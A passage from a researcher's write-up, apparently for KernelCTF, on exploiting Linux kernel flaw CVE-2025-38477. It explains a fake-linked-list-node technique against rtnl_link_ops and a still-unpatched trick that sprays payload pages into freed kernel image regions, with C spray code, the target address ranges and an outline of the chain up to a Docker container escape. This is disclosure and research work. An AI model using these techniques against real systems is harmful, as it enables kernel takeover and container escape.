	int                        (*fill_linkxstats)(struct sk_buff *, const struct net_device  *, int *, int); /*  0xc8   0x8 */

	/* size: 208, cachelines: 4, members: 26 */
	/* sum members: 201, holes: 2, sum holes: 7 */
	/* last cacheline: 16 bytes */
};
```

`rtnl_link_ops` holds the callback table for each rtnetlink “link type” (e.g.,
ipvlan). When userspace asks the kernel to create/modify/delete a rtnetlink
device (via `RTM_NEWLINK`, `RTM_DELLINK`, etc.), the kernel scans the global
linked list of registered `rtnl_link_ops` and selects the entry whose `kind`
matches the user-provided type (e.g., "ipvlan"). If a UAF-unlink primitive lets
us splice a forged `rtnl_link_ops` node into that list (with a correctly
targeted `kind`). The subsequent rtnetlink operations will dispatch into
attacker-controlled function pointers, turning the UAF-unlink into arbitrary
code execution.


`LL_ATK` is not only limited on `rtnl_link_ops` but a strategy of using
UAF-Unlink. `LL_ATK` is a exploitation skill transforms UAF-Unlink to
fake node insertion and then Arbitrary-Code-Execution. Considering
the large use of linked lists, it can be used on lots of UAFs to make
exploitation easier. (e.g., CVE-2023-4623, where I first designed it). It solves
the problem of "where to write".

## Leave Payload next to Kernel Resource: `NPerm`

> Note: This is not an exploitation bug per se; we’ve reported it to the kernel
> hardening team and a patch discussion is ongoing.

In the `LL_ATK` setting, “what to write” is really “where to place the fake
node.” As we mentioned in previous section, `LL_ATK` doesn't require any heap
leak but only KASLR (Kernel Base) leak (it's not hard because of prefetch attack
currently). `NPerm` solved the problem to "leave our payload somewhere based on
KASLR(Kernel Base) to avoid additional leak".


`NPerm` exploits a long-standing (decades-old) kernel design issue. We (@n132
and @kyle) identified it in Spring 2025 and reported it to the kernel security
team. Some maintainers did not consider it a security vulnerability and
suggested submitting a hardening patch instead. That patch has not yet landed,
so the issue remains exploitable (e.g., in KernelCTF). We also noticed that
@XuaizaYa shows they independently described the same behavior in a [recent
write-up][5], without pinpointing the root cause.

> From our original email to kernel security team:
> I am writing to bring to your attention some security vulnerabilities
> I have discovered. These vulnerabilities allow users to allocate pages
> mapped to kernel image areas, which would make kernel exploitation
> easier, considering side-channel attacks.
>
> There are mainly 4 regions not removed from kernel image mapping after free:
> - [rodata_resource.end, data_resource.start]
> - [__init_begin, __init_end]
> - [__smp_locks, __smp_locks_end]
> - [_brk_end, hpage_align(__end_of_kernel_reserve)]
> User space processes can use mmap to get pages in these areas and
> leave their ROP chain on these pages so they can pivot the stack to
> these areas with leaked kernel text base (via side-channel attacks).

The root cause of the `NPerm`-vulnerability is that kernel release some pages
used during early boot stage but it didn't "UNMAP" these pages on kernel
resource areas. Therefore, if we get these pages back from memory and we can
still visit them through their "MAPPED" address on kernel resource.


It's super easy to use as we shown on the exploitation script:
```c
#define PAYLOAD_SPRAY_PAGES 0x10
#define PAGE_SIZE 0x1000
#define TOTAL_ALLOCATION (PAGE_SIZE * PAYLOAD_SPRAY_PAGES)

void nperm(){
    // Drain memory to increase chance of getting pages from the target regions.
    pgvAdd(1, 9, 0x610);
    for(int i = 0; i < PAYLOAD_SPRAY_PAGES; i++){
        // PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS
        void* addr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(addr == MAP_FAILED)
            break;
        memcpy(addr, payload, sizeof(payload)); // Spray payload
    }
    pgvDel(1); // Release the memory
}
```

We use `pgv` allocation (not necessary but make it faster) to drain the memory
and then spray our payload by `mmap`. Then we can find our payload on the
following 4 regions:

- [rodata_resource.end, data_resource.start]
- [__init_begin, __init_end]
- [__smp_locks, __smp_locks_end]
- [_brk_end, hpage_align(__end_of_kernel_reserve)]


`NPerm` enables us to load our payload on a known address only with KASLR
(Kernel Base) leak, which solves "What to write" problem.


## LL_ATK × NPerm: From UAF-Unlink to Code Execution


Combining `LL_ATK` and `NPerm` dramatically simplifies exploitation. In our
case, once we had a `UAF-Unlink` primitive, the final exploit core (sans comments)
fit in ~16 lines. The two techniques are independent and
reusable: `LL_ATK` inserts a fake node into a targeted kernel list; `NPerm`
lands the fake node next to kernel resource area so we don't need additional
kernel heap leak.

Summary: Together, `LL_ATK` + `NPerm` form a generic, practical pathway to
transform a UAF-Unlink into reliable arbitrary code execution.


# Overview of Exploitation

- `Prefetch` to leak the base address of kernel
- `NPerm` to leave payload next to kernel resource
- `ExpRace` to generate HW interrupts at background (enlarge racing window)
- `BLIND SHARK` to win the race
- Transform the refcount issue to UAF
- `LL_ATK`: UAF-Unlink (hlist) to link fake prot into prot lists
- Trigger the function pointer on the linked faked struct
- `core_pattern` Escaping: Escape Docker Container


The original exploitation source/binary are in
[original.tar.gz](./original.tar.gz) for your reference.

# Epilogue


The discovery and exploitation of CVE-2025-38477 became a sequence of hard-won
breakthroughs. What began as a null dereference evolved into a stable exploit
won KernelCTF. In the end, it was the toughest vulnerability I’ve ever
exploited, and the path to get there was as rewarding as the result.

What a wonderful journey!


# Reference

[CARDSHARK: Understanding and Stablizing Linux Kernel Concurrency Bugs Against the Odds][1]

[ExpRace: Exploiting Kernel Races through Raising Interrupts][2]

[EntryBleed: A Universal KASLR Bypass against KPTI on Linux][6]




[1]: https://www.usenix.org/system/files/usenixsecurity24-han-tianshuo.pdf
[2]: https://www.usenix.org/system/files/sec21-lee-yoochan.pdf
[3]: https://lore.kernel.org/all/aGIAbGB1VAX-M8LQ@xps/
[4]: https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=462dbc9101ac
[5]: https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-5
[6]: https://dl.acm.org/doi/proceedings/10.1145/3623652
